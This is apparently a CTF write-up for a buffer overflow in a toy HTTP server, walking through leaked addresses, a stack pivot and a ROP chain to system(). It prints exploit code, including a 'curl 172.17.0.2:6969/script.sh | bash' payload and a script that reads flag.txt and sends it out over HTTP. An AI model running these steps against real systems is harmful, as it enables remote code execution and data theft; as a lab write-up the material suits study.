# Final Boss - CTF Challenge Writeup

## Challenge Overview

This is a binary exploitation challenge featuring a vulnerable HTTP server with a buffer overflow vulnerability. The goal is to exploit the server to retrieve the flag.

## Vulnerability Analysis

### The Vulnerable Code

In `main2.c`, the `handle_submit()` function contains a classic buffer overflow:

```c
void handle_submit(int client_fd, const char *body) {
    char buf[80];  // overflow target
    
    // Vulnerability: no bounds check - copies 128 bytes into 80-byte buffer
    memcpy(buf, body, 128);
    ...
}
```

The buffer is only 80 bytes, but the code copies 128 bytes from user input, creating a 48-byte overflow that overwrites the saved return address and other stack data.

### Information Leaks

The server helpfully provides two critical leaks on the GET / endpoint:

1. **Stack Leak**: Address of the `body` buffer in `handle_client()`
2. **Libc Leak**: Address of the `puts()` function

These leaks defeat ASLR and allow us to calculate:
- Exact stack addresses for ROP chain placement
- Libc base address for gadget/function addresses

## Exploitation Strategy

### Step 1: Gather Leaks

The exploit first makes a GET request to retrieve the stack and libc addresses:

```python
r = remote("localhost", 8080)
r.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
resp = r.recvrepeat(timeout=2).decode()

stack_leak = int(re.search(r'Stack Leak.*?: (0x[0-9a-f]+)', resp).group(1), 16)
puts = int(re.search(r'Maybe This Helps\.\.\. (0x[0-9a-f]+)', resp).group(1), 16)
```

### Step 2: Calculate Addresses

With the puts address, we calculate the libc base:

```python
glibc.address = puts - 0x5fbe0  # Offset of puts in libc.so.6
```

### Step 3: Build ROP Chain

The exploit uses a stack pivot technique with the following ROP chain:

```python
exploit = p64(0xdeadbeef)                    # Fake RBP
        + p64(pop_rdi)                       # Gadget: pop rdi; ret
        + p64(stack_leak+0x28)               # Argument: pointer to command string
        + p64(ret)                           # Stack alignment
        + p64(glibc.address+0x30750)         # system()
        + b"curl 172.17.0.2:6969/script.sh | bash\x00"  # Command to execute
```

The payload structure:
- Fills the 80-byte buffer with the ROP chain
- Pads to reach the saved RBP (104 bytes total)
- Overwrites saved RBP with `stack_leak` (points back to our buffer)
- Overwrites return address with `pop rbp; ret` gadget
- Followed by `leave` instruction address

### Step 4: Stack Pivot Execution

The `leave; ret` sequence performs a stack pivot:
1. `leave` = `mov rsp, rbp; pop rbp` - moves stack pointer to our controlled buffer
2. `ret` - pops the next address (our `pop_rdi` gadget) and jumps to it
3. ROP chain executes: `pop rdi` loads command string address, then calls `system()`

### Step 5: Exfiltrate Flag

The executed command downloads and runs `script.sh`:

```bash
curl 172.17.0.2:6969/script.sh | bash
```

The script reads the flag and exfiltrates it via HTTP:

```bash
FLAG=$(tr -d '\n' < flag.txt)
python3 - <<EOF
import urllib.request
urllib.request.urlopen("http://172.17.0.2:6969/flag?=$FLAG")
EOF
```
a
## Key Techniques

1. **Information Leaks**: Leveraging provided stack and libc addresses to defeat ASLR
2. **Buffer Overflow**: Overwriting return address with 48-byte overflow
3. **Stack Pivot**: Using `leave; ret` gadget to redirect execution to controlled buffer
4. **ROP Chain**: Calling `system()` with controlled argument
5. **Out-of-Band Exfiltration**: Using HTTP callback to retrieve flag

## Exploit Execution

```bash
# Start listener to receive flag
python3 -m http.server 6969 

# Run exploit
python3 exploit.py
```

The exploit sends a POST request with the crafted payload, triggering the overflow and executing the ROP chain to exfiltrate the flag.

Implementing proper input validation and sanitization.
